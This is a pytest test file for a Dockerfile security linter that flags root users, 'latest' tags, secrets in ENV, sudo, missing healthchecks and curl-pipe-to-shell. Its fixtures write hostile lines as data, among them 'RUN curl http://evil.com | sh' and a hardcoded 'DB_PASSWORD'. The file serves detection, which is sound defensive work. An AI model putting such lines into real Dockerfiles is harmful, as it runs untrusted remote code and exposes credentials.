"""Tests for Dockerfile Linter core."""

from __future__ import annotations

from pathlib import Path

import pytest

from project_87.core import (
    LintFinding,
    check_expose_privileged_port,
    check_healthcheck,
    check_no_apt_upgrade,
    check_no_curl_pipe_sh,
    check_no_latest_tag,
    check_no_root_user,
    check_no_secrets_in_env,
    check_no_sudo,
    lint_dockerfile,
    parse_dockerfile,
)


def write_dockerfile(tmp_path: Path, content: str) -> Path:
    f = tmp_path / "Dockerfile"
    f.write_text(content)
    return f


class TestParseDockerfile:
    def test_basic_parse(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu:22.04\nRUN apt-get update\nUSER app\n")
        instructions = parse_dockerfile(f)
        instrs = [i.instruction for i in instructions]
        assert "FROM" in instrs
        assert "RUN" in instrs
        assert "USER" in instrs

    def test_skips_comments(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "# comment\nFROM ubuntu:22.04\n")
        instructions = parse_dockerfile(f)
        assert len(instructions) == 1

    def test_line_continuation(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "RUN apt-get install \\\n    curl \\\n    wget\n")
        instructions = parse_dockerfile(f)
        assert len(instructions) == 1
        assert "curl" in instructions[0].arguments


class TestCheckNoRootUser:
    def test_no_user_flags_critical(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu:22.04\nRUN echo hi\n")
        instructions = parse_dockerfile(f)
        findings = check_no_root_user(instructions)
        assert len(findings) == 1
        assert findings[0].severity == "CRITICAL"

    def test_non_root_user_passes(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu:22.04\nUSER appuser\n")
        instructions = parse_dockerfile(f)
        findings = check_no_root_user(instructions)
        assert findings == []

    def test_explicit_root_still_flags(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu:22.04\nUSER root\n")
        instructions = parse_dockerfile(f)
        findings = check_no_root_user(instructions)
        assert len(findings) == 1


class TestCheckNoLatestTag:
    def test_latest_flagged(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu:latest\n")
        instructions = parse_dockerfile(f)
        findings = check_no_latest_tag(instructions)
        assert len(findings) == 1

    def test_no_tag_flagged(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu\n")
        instructions = parse_dockerfile(f)
        findings = check_no_latest_tag(instructions)
        assert len(findings) == 1

    def test_pinned_passes(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu:22.04\n")
        instructions = parse_dockerfile(f)
        findings = check_no_latest_tag(instructions)
        assert findings == []


class TestCheckNoSecretsInEnv:
    def test_password_in_env_flagged(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "ENV DB_PASSWORD=secret123\n")
        instructions = parse_dockerfile(f)
        findings = check_no_secrets_in_env(instructions)
        assert len(findings) == 1
        assert findings[0].severity == "CRITICAL"

    def test_clean_env_passes(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "ENV APP_PORT=8080\n")
        instructions = parse_dockerfile(f)
        findings = check_no_secrets_in_env(instructions)
        assert findings == []


class TestCheckHealthcheck:
    def test_missing_healthcheck(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu:22.04\nUSER app\n")
        instructions = parse_dockerfile(f)
        findings = check_healthcheck(instructions)
        assert len(findings) == 1

    def test_with_healthcheck_passes(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu:22.04\nHEALTHCHECK CMD curl -f http://localhost/ || exit 1\n")
        instructions = parse_dockerfile(f)
        findings = check_healthcheck(instructions)
        assert findings == []


class TestCheckSudo:
    def test_sudo_flagged(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "RUN sudo apt-get install curl\n")
        instructions = parse_dockerfile(f)
        findings = check_no_sudo(instructions)
        assert len(findings) == 1

    def test_no_sudo_passes(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "RUN apt-get install curl\n")
        instructions = parse_dockerfile(f)
        findings = check_no_sudo(instructions)
        assert findings == []


class TestCheckCurlPipeSh:
    def test_curl_pipe_sh_flagged(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "RUN curl -fsSL https://get.example.com | bash\n")
        instructions = parse_dockerfile(f)
        findings = check_no_curl_pipe_sh(instructions)
        assert len(findings) == 1
        assert findings[0].severity == "ERROR"

    def test_safe_curl_passes(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "RUN curl -o installer.sh https://example.com/install.sh\n")
        instructions = parse_dockerfile(f)
        findings = check_no_curl_pipe_sh(instructions)
        assert findings == []


class TestLintDockerfile:
    def test_full_lint(self, tmp_path: Path) -> None:
        content = (
            "FROM ubuntu:latest\n"
            "ENV DB_PASSWORD=secret\n"
            "RUN curl http://evil.com | sh\n"
        )
        f = write_dockerfile(tmp_path, content)
        result = lint_dockerfile(f)
        assert result.instructions_count == 3
        assert len(result.findings) > 0
        severities = {f.severity for f in result.findings}
        assert "CRITICAL" in severities or "ERROR" in severities

    def test_to_dict(self, tmp_path: Path) -> None:
        f = write_dockerfile(tmp_path, "FROM ubuntu:22.04\nUSER app\nHEALTHCHECK CMD true\n")
        result = lint_dockerfile(f)
        d = result.to_dict()
        assert "findings" in d
        assert "total_findings" in d
